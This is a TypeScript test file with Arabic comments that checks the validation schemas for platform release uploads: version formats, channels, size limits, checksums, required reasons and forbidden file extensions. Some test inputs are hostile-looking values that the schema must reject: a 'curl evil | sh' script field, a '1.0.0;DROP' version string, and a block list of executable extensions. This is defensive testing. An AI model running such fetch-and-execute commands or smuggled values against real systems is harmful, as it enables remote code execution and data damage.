import { describe, expect, it } from 'vitest';

import {
  platformReleaseLimits,
  platformReleaseReasonSchema,
  platformReleaseUploadSchema,
  releaseForbiddenExtensions,
  releaseManifestSchema,
  releaseRejectionCodes,
  releaseRejectionMessages,
} from './releases.js';

/**
 * 🗜️ عقود تحديث المنصّة — القيود التي تحمي الخادم من أرشيفٍ يرفعه إنسان.
 *
 * الفحص هنا لا يقيس HTML أو SQL: يقيس **القبول**. البيان الصالح الواحد يُقبل، وكل ما
 * يُخرج الإصدار عن صيغةٍ تُقارَن يُرفض قبل أن يبلغ الخادم.
 */
describe('platform releases contracts (P-C13)', () => {
  const validManifest = {
    version: '2026.10.2',
    channel: 'stable',
    notes: 'إصلاح حساب الضريبة في مرتجع المبيعات.',
    highlights: ['ضريبة المرتجع على صافي السطر'],
  };

  it('يقبل بياناً سليماً ويطبّق الافتراضيات', () => {
    const parsed = releaseManifestSchema.safeParse(validManifest);
    expect(parsed.success).toBe(true);
    if (!parsed.success) return;
    expect(parsed.data.channel).toBe('stable');
    expect(parsed.data.highlights).toHaveLength(1);
    expect(parsed.data.minFromVersion).toBeUndefined();

    const minimal = releaseManifestSchema.safeParse({ version: '1.0.0', notes: 'أول إصدار' });
    expect(minimal.success).toBe(true);
    if (!minimal.success) return;
    expect(minimal.data.highlights).toEqual([]);
  });

  it('يرفض إصداراً لا يُقارَن، وقناةً مجهولة، وحقلاً خارج البيان', () => {
    for (const version of ['', 'v1', '1', 'final-final', '1.0.0 beta', '1.0.0;DROP']) {
      expect(releaseManifestSchema.safeParse({ ...validManifest, version }).success, version).toBe(false);
    }
    // صيغٌ تُقبل: `X.Y`, `X.Y.Z`, `X.Y.Z.W`, ولاحقةٌ نصّية.
    for (const version of ['1.2', '2026.10.2', '1.2.3.4', '2.0.0-rc.1']) {
      expect(releaseManifestSchema.safeParse({ ...validManifest, version }).success, version).toBe(true);
    }

    expect(releaseManifestSchema.safeParse({ ...validManifest, channel: 'nightly' }).success).toBe(false);
    expect(releaseManifestSchema.safeParse({ ...validManifest, script: 'curl evil | sh' }).success).toBe(false);
    expect(releaseManifestSchema.safeParse({ ...validManifest, notes: '' }).success).toBe(false);
    expect(
      releaseManifestSchema.safeParse({ ...validManifest, highlights: Array.from({ length: 11 }, () => 'س') })
        .success,
    ).toBe(false);
  });

  it('يحدّ حجم الحزمة وعدد ملفاتها وحجم الملفّ الواحد', () => {
    expect(platformReleaseLimits.maxBytes).toBe(8 * 1024 * 1024);
    expect(platformReleaseLimits.maxEntries).toBe(500);
    expect(platformReleaseLimits.maxEntryBytes).toBeLessThanOrEqual(platformReleaseLimits.maxBytes);

    // سقف base64 في العقد يطابق سقف الأرشيف (‏4/3 + هامش) — لا يرفض مخططٌ ما يقبله الفاحص.
    const payload = 'A'.repeat(Math.ceil((platformReleaseLimits.maxBytes * 4) / 3) + 8);
    expect(
      platformReleaseUploadSchema.safeParse({
        filename: 'x.zip',
        contentBase64: payload,
        reason: 'نشر إصدارٍ كبير',
      }).success,
    ).toBe(true);
    expect(
      platformReleaseUploadSchema.safeParse({
        filename: 'x.zip',
        contentBase64: `${payload}A`,
        reason: 'نشر إصدارٍ أكبر',
      }).success,
    ).toBe(false);
  });

  it('يقبل الرفع بسببٍ مكتوب وبصمةٍ سليمة، ويرفض سبباً مبتوراً أو بصمةً مشوّهة', () => {
    const base = { filename: 'erp.zip', contentBase64: 'UEsDBA==', reason: 'نشر إصدار الشهر' };
    expect(platformReleaseUploadSchema.safeParse(base).success).toBe(true);
    expect(
      platformReleaseUploadSchema.safeParse({ ...base, checksum: 'a'.repeat(64) }).success,
    ).toBe(true);

    expect(platformReleaseUploadSchema.safeParse({ ...base, reason: 'سريع' }).success).toBe(false);
    for (const checksum of ['a'.repeat(63), 'A'.repeat(64), 'zz', '']) {
      expect(platformReleaseUploadSchema.safeParse({ ...base, checksum }).success, checksum).toBe(false);
    }
    // حقلٌ مجهول لا يُمرَّر: من يرسل `run` يتوقّع تنفيذاً، والرفض هنا يُعلن أنه لا يوجد.
    expect(platformReleaseUploadSchema.safeParse({ ...base, run: true }).success).toBe(false);
  });

  it('سبب الإعلان والسحب نصٌّ لا يُختصر', () => {
    expect(platformReleaseReasonSchema.safeParse({ reason: 'سحبٌ لخطأٍ في الضريبة' }).success).toBe(true);
    expect(platformReleaseReasonSchema.safeParse({ reason: 'خطأ' }).success).toBe(false);
    expect(platformReleaseReasonSchema.safeParse({}).success).toBe(false);
    expect(platformReleaseReasonSchema.safeParse({ reason: 'سحب', why: 'x' }).success).toBe(false);
  });

  it('لكل سبب رفضٍ رسالةٌ عربية غير فارغة، وقائمة الامتدادات تسمّي التنفيذي', () => {
    expect(releaseRejectionCodes).toHaveLength(12);
    for (const code of releaseRejectionCodes) {
      expect(releaseRejectionMessages[code].length, code).toBeGreaterThan(3);
    }
    for (const extension of ['exe', 'dll', 'sh', 'ps1', 'js', 'jar', 'php', 'py']) {
      expect(releaseForbiddenExtensions as readonly string[]).toContain(extension);
    }
  });
});
